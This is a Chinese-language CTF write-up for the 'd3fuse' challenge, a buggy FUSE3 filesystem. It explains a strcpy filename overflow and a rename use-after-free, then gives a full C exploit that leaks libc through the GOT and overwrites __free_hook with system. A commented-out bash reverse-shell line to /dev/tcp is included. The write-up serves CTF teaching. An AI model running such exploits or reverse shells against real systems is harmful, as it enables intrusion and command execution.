# d3fuse

## 题目简述

一道简单题，给大家签个到，灵感来自室友充满 bug 的操作系统实验作业

远程环境构建的时候，ubuntu 20.04 的 libc 还是 Ubuntu GLIBC 2.31-0ubuntu9.2，比赛时选手自己构建的时候 libc 已经是 Ubuntu GLIBC 2.31-0ubuntu9.7 了，造成远程环境和本地环境有差异，对造成影响的选手表示歉意

题目是基于 fuse3 写的用户态文件系统，文件系统挂载到了 /chroot/mnt  目录下

题目的目的是通过利用该文件系统的漏洞，拿到该文件系统程序的权限，对于该题目来说就是为了拿到被 chroot 隔离的 flag

可以参考 https://github.com/libfuse/libfuse/blob/master/example/hello.c 了解一个 fuse 程序的编写

`hello.c` 是 libfuse 官方示例，展示了一个最小用户态文件系统如何注册 `fuse_operations`：`getattr` 返回文件/目录属性，`readdir` 枚举目录项，`open` 检查打开权限，`read` 根据 offset/size 返回文件内容。本题也是围绕这些文件系统回调实现自定义目录、文件、rename、read/write 等操作，因此分析时要从回调函数和内部文件结构体之间的映射入手。

参考 fuse_operations 结构体的定义，可以帮助分析各个文件系统操作

## 解题过程

该题存在两个漏洞：

第一个是文件结构体的文件名长度是固定的，创建文件或目录的时候，通过 strcpy 写入文件名，可以溢出覆盖文件的 size 字段，和指向文件内容的 content 指针

关键逻辑是目录项里 `name` 的空间固定，但创建路径使用 `strcpy` 写入文件名；当文件名过长时，会覆盖相邻的 `size` 和 `content` 指针。

第二个是 rename 操作，在重命名文件后，把文件的 content 指针给 free 了，存在 UAF

`rename` 中会把旧 `content` 拷贝到新对象后释放原指针，后续仍可通过原文件对象访问，形成 UAF。

题目也关闭了 PIE 降低了利用难度（主要是开了 PIE 我没利用成功）

第一个洞可以通过覆盖 content 指针来任意读写，关闭 PIE 的同时也让 GOT 表可写，只要改写

GOT[free] 为 system 即可执行任意命令

第二个洞可以通过 UAF 伪造目录或者文件，控制整个文件结构体，同样可以任意读写

我看了看收上来的 WP，发现选手都用的第一个洞，而且利用起来也很简单，我这里只给出第二个洞的exp 吧

```c
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#define SPRAY_SIZE 0x20

#define OPEN(x, filename, flags) do { \
    files[x] = open(filename, flags); \
    if (files[x] < 0) { \
        perror(filename); \
        exit(-1); \
    } \
} while (0);

#define WRITE(x, off, size) do { \
    if (off != lseek(files[x], off, SEEK_SET)) { \
        perror("lseek"); \
        exit(-2); \
    } \
    if (size != write(files[x], buf, size)) { \
        perror("write"); \
        exit(-2); \
    } \
} while (0);

#define READ(x, off, size) do { \
    if (off != lseek(files[x], off, SEEK_SET)) { \
        perror("lseek"); \
        exit(-3); \
    } \
    if (size != read(files[x], buf, size)) { \
        perror("read"); \
        exit(-3); \
    } \
} while (0);

#define UNLINK(filename) do { \
    if (0 != unlink(filename)) { \
        perror("unlink"); \
        exit(-4); \
    } \
} while (0);

#define TRUNCATE(x, size) do { \
    if (0 != ftruncate(files[x], size)) { \
        perror("truncate"); \
        exit(-5); \
    } \
} while (0);

#define RENAME(a, b) do { \
    if (0 != rename(a, b)) { \
        perror("rename"); \
        exit(-5); \
    } \
} while (0);

#define MKDIR(a) do { \
    if (0 != mkdir(a, 0)) { \
        perror("mkdir"); \
        exit(-6); \
    } \
} while (0);

#define CLOSE(x) do { close(files[x]); } while (0);



int files[1024];
char buf[0x600];
char filename[0x100];
struct stat st;

char *cmd = "cp /flag /chroot/rwdir/flag";
//char *cmd = "bash  -c 'bash -i >& /dev/tcp/ip/port 0>&1' &";

int main()
{
    puts("fill root dir");
    for (int i = 0; i < SPRAY_SIZE+2; i++) {
        sprintf(filename, "/mnt/fill%d", i);
        OPEN(0, filename, O_RDWR | O_CREAT);
        CLOSE(0);
    }

    for (int i = 0; i < SPRAY_SIZE+2; i++) {
        sprintf(filename, "/mnt/fill%d", i);
        UNLINK(filename);
    }

    puts("create uaf");
    OPEN(0, "/mnt/1.txt", O_RDWR | O_CREAT);
    TRUNCATE(0, 0x300);
    CLOSE(0);

    OPEN(0, "/mnt/free.txt", O_RDWR | O_CREAT);
    strcpy(buf, cmd);
    WRITE(0, 0, strlen(buf) + 1);
    CLOSE(0);

    RENAME("/mnt/1.txt", "/mnt/2.txt"); // & uaf
    OPEN(0, "/mnt/2.txt", O_RDWR);

    for (int i = 0; i < SPRAY_SIZE; i++) {
        sprintf(filename, "/mnt/dir%d", i);
        MKDIR(filename);
        sprintf(filename, "/mnt/dir%d/fake_file", i);
        OPEN(i+1, filename, O_RDWR | O_CREAT);
        TRUNCATE(i+1, 0x20);
        CLOSE(i+1);
    }

    READ(0, 0, 0x30); // dir entry
    if (strncmp("fake_file", buf, 9)) {
        puts("failed");
        return 0;
    }

    printf("filename=%s\n", buf);

    *(size_t *)&buf[0x24] = 0x8;        // size
    *(size_t *)&buf[0x28] = 0x405018;   // content ptr = got['free']

    WRITE(0, 0, 0x30); // modify ./mnt/dir/1.txt File Header

    puts("leak libc");
    sleep(1);

    size_t free_ptr;
    int fd = -1;
    for (int i = 0; i < SPRAY_SIZE; i++) {
        sprintf(filename, "/mnt/dir%d/fake_file", i);
        lstat(filename, &st);
        printf("size = %d\n", st.st_size);
        if (st.st_size == 8) {
            fd = 1;
            OPEN(1, filename, O_RDWR);
            break;
        }
    }

    if (fd < 0) {
        puts("libc not found");
        return 0;
    }

    READ(1, 0, 8);
    free_ptr = *(size_t *)&buf[0];

    size_t lbase = free_ptr - 0x9d850;
    size_t system_ptr = lbase + 0x55410;
    size_t free_hook = lbase + 0x1eeb28;
    printf("free = %#lx\n", free_ptr);
    printf("lbase = %#lx\n", lbase);

    puts("content ptr -> free_hook");
    *(size_t *)&buf[0] = free_hook;
    WRITE(0, 0x28, 8);

    puts("set free_hook=system");
    *(size_t *)&buf[0] = system_ptr;
    WRITE(fd, 0, 8);

    // free !
    puts("free");
    UNLINK("/mnt/free.txt");

    return 0;
}
```

## 方法总结

- 核心技巧：FUSE 程序虽然运行在用户态，但文件操作入口来自内核转发的回调；漏洞通常出现在路径、文件名、目录项和自定义文件结构体的同步逻辑中。
- 两个漏洞：创建文件/目录时 `strcpy` 固定长度文件名可覆盖 `size/content`，形成任意读写；`rename` 后错误释放 `content`，形成 UAF，可伪造文件或目录结构。
- 利用路线：关闭 PIE 且 GOT 可写时，可通过任意读写泄露 libc，再把 `free` 相关入口改到 `system` 或 `__free_hook`，最后释放保存命令字符串的文件内容触发命令执行。
- 复用要点：chroot 场景下拿到的是 FUSE 进程权限，最终目标通常是把 `/flag` 拷贝到 chroot 可见目录，或用同等方式把隔离外资源带回可读位置。
